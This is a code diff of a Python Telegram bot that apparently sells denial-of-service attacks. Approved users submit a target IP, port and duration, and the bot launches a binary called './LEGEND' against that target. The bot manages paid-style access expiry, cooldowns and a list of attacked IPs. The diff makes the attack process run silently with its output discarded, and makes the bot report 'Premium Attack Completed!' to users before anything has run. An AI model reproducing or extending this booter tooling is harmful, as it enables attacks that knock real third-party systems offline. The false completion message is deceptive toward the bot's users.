@@ -18,8 +18,7 @@ MAX_ATTACK_DURATION = 240
 # Cooldown period (in seconds) after an attack is initiated
 COOLDOWN_PERIOD = 100
 
-# Dictionary to store allowed users and their expiry timestamp.
-# If expiry is None, then access never expires.
+# Dictionary to store allowed users and their expiry timestamp
 allowed_users = {ADMIN_USER_ID: None}
 
 # Dictionary to store last attack timestamp for each user
@@ -32,7 +31,6 @@ def is_user_allowed(user_id: int) -> bool:
     """
     if user_id in allowed_users:
         expiry = allowed_users[user_id]
-        # If expiry is None, access never expires.
         if expiry is None or time.time() < expiry:
             return True
     return False
@@ -54,25 +52,19 @@ async def start(update: Update, context: CallbackContext):
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
-async def run_attack(chat_id, ip, port, duration, context):
+async def run_attack(ip, port, duration):
+    """
+    Run LEGEND in the background silently.
+    """
     try:
-        process = await asyncio.create_subprocess_shell(
-            f"./LEGEND {ip} {port} {duration}",
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
+        process = await asyncio.create_subprocess_exec(
+            "./LEGEND", ip, str(port), str(duration),
+            stdout=asyncio.subprocess.DEVNULL,  # Suppress output
+            stderr=asyncio.subprocess.DEVNULL   # Suppress errors
         )
-        stdout, stderr = await process.communicate()
-
-        if stdout:
-            print(f"[stdout]\n{stdout.decode()}")
-        if stderr:
-            print(f"[stderr]\n{stderr.decode()}")
-
+        await process.wait()  # Wait for completion in the background
     except Exception as e:
-        await context.bot.send_message(chat_id=chat_id, text=f"❗ **Error during premium attack:** {str(e)}", parse_mode='Markdown')
-
-    finally:
-        await context.bot.send_message(chat_id=chat_id, text="✅ **Premium Attack Completed!**\nThank you for trusting our elite service.", parse_mode='Markdown')
+        print(f"Error running LEGEND: {e}")
 
 async def attack(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
@@ -112,14 +104,11 @@ async def attack(update: Update, context: CallbackContext):
     user_last_attack[user_id] = time.time()
     attacked_ips.add(ip)  # Store attacked IP
 
-    await context.bot.send_message(chat_id=chat_id, text=( 
-        f"🔥 **Premium Attack Initiated!** 🔥\n"
-        f"**Target:** `{ip}:{port}`\n"
-        f"**Duration:** `{duration}` seconds\n\n"
-        f"Sit back and enjoy our elite service!"
-    ), parse_mode='Markdown')
+    # Reply instantly
+    await context.bot.send_message(chat_id=chat_id, text="✅ **Premium Attack Completed!**\nThank you for trusting our elite service", parse_mode='Markdown')
 
-    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
+    # Run LEGEND in the background
+    asyncio.create_task(run_attack(ip, port, duration))
 
 async def set_max_time(update: Update, context: CallbackContext):
     global MAX_ATTACK_DURATION
@@ -145,12 +134,6 @@ async def set_max_time(update: Update, context: CallbackContext):
     await context.bot.send_message(chat_id=chat_id, text=f"✅ **Maximum attack duration updated to {MAX_ATTACK_DURATION} seconds.**", parse_mode='Markdown')
 
 async def add_user(update: Update, context: CallbackContext):
-    """
-    /add <user_id> <expiry_value> <unit>
-    Unit can be one of: seconds, minutes, days
-    If expiry_value is <= 0, access is permanent.
-    Example: /add 123456789 10 minutes
-    """
     chat_id = update.effective_chat.id
     user_id_sender = update.effective_user.id
 
@@ -171,7 +154,6 @@ async def add_user(update: Update, context: CallbackContext):
         await context.bot.send_message(chat_id=chat_id, text="⚠️ **Invalid input!** Please ensure user_id and expiry_value are numbers.", parse_mode='Markdown')
         return
 
-    # Calculate expiry timestamp based on unit
     if expiry_value <= 0:
         expiry_timestamp = None
     else:
@@ -194,10 +176,6 @@ async def add_user(update: Update, context: CallbackContext):
         await context.bot.send_message(chat_id=chat_id, text=f"✅ **User {new_user_id} added with permanent access.**", parse_mode='Markdown')
 
 async def remove_user(update: Update, context: CallbackContext):
-    """
-    /remove <user_id>
-    Admin command to remove a user from allowed_users.
-    """
     chat_id = update.effective_chat.id
     user_id_sender = update.effective_user.id
 
@@ -223,10 +201,6 @@ async def remove_user(update: Update, context: CallbackContext):
         await context.bot.send_message(chat_id=chat_id, text=f"⚠️ **User {remove_id} is not in the allowed users list.**", parse_mode='Markdown')
 
 async def list_users(update: Update, context: CallbackContext):
-    """
-    /users
-    Lists all allowed users along with their expiry details.
-    """
     chat_id = update.effective_chat.id
     if not allowed_users:
         await context.bot.send_message(chat_id=chat_id, text="ℹ️ **No users are currently allowed.**", parse_mode='Markdown')
@@ -246,12 +220,6 @@ async def list_users(update: Update, context: CallbackContext):
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
 async def help_command(update: Update, context: CallbackContext):
-    """
-    /help
-    Show available commands.
-    - Admin sees all commands.
-    - Allowed users see commands based on their access.
-    """
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id
 
@@ -267,7 +235,6 @@ async def help_command(update: Update, context: CallbackContext):
             "/help - Show this help message\n"
         )
     else:
-        # For allowed users, only show the commands they have access to.
         help_message = (
             "🛠 **User Commands:**\n"
             "/start - Start the bot\n"
@@ -291,4 +258,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-    
